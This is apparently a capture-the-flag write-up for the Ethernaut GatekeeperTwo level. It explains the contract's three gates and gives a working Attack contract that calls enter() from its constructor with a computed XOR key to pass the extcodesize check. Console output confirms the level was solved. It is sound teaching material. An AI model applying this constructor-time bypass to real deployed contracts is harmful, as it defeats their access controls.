# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Challenge's message:

> This gatekeeper introduces a few new challenges. Register as an entrant to pass this level. - Remember what you've learned from getting past the first gatekeeper the first gate is the same. - The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](https://docs.soliditylang.org/en/v0.4.23/assembly.html) for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf). - The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](https://docs.soliditylang.org/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.


The *GatekeeperTwo* contract implements a gatekeeping mechanism that restricts entry to a certain function based on three specific conditions. There is a public address entrant variable that stores the address of the entrant who successfully passes the gatekeeping conditions.

### Modifiers

#### gateOne()

This modifier enforces a condition that the *msg.sender* (the caller of the function) is not the same as the *tx.origin* (the origin of the transaction). In other words, it ensures that the function is not called directly but is being called through another contract or function.

#### gateTwo()

This modifier checks if the caller of the function has an external code size of zero. It does this by using inline assembly to retrieve the external code size of the caller's address. If the code size is zero, the function execution proceeds, and if not, it throws an error. This condition prevents the function from being called by another contract.

#### gateThree()

This modifier takes a parameter *_gateKey* of type *bytes8* and enforces one condition:

The condition checks if the XOR operation between the first 8 bytes of the keccak256 hash of the *msg.sender* address and the *_gateKey* is equal to the maximum value of type *uint64*. If this condition is not met, the function execution throws an error. This condition introduces a cryptographic check on the *_gateKey* to verify the authenticity of the entrant.


In the enter() function is the entry point of the contract and is used to gain access based on the gatekeeping conditions. It takes a parameter _gateKey of type bytes8 which is used in the gateThree modifier. The function first applies the *gateOne*, *gateTwo*, and *gateThree* modifiers to enforce the respective conditions. If all the conditions are met, the *entrant* variable is updated with the tx.origin (the origin of the transaction) and the function returns *true*.

It's important to note that the code uses low-level assembly and cryptographic operations to perform the gatekeeping checks, which may have been implemented for specific security requirements or anti-cheat mechanisms. The exact rationale behind the conditions is not provided in the code, and further context would be necessary to understand the full purpose and security implications of the gatekeeping mechanism.


# Subverting


```solidity
pragma solidity ^0.8.17;

import './GatekeeperTwo.sol';

contract Attack{

    GatekeeperTwo target;

    constructor(address _target){
        target = GatekeeperTwo(_target);
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
        target.enter(gateKey);  
    }
}
```

```shell
await contract.entrant()
'0x0000000000000000000000000000000000000000'
```

```shell
await contract.entrant()
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

0age's,who is owner of the challenge, message:

> Way to go! Now that you can get past the gatekeeper, you have what it takes to join theCyber, a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on reddit or via email and use it to register with the contract at gatekeepertwo.thecyber.eth (be aware that only the first 128 entrants will be accepted by the contract).


**_by wasny0ps_**

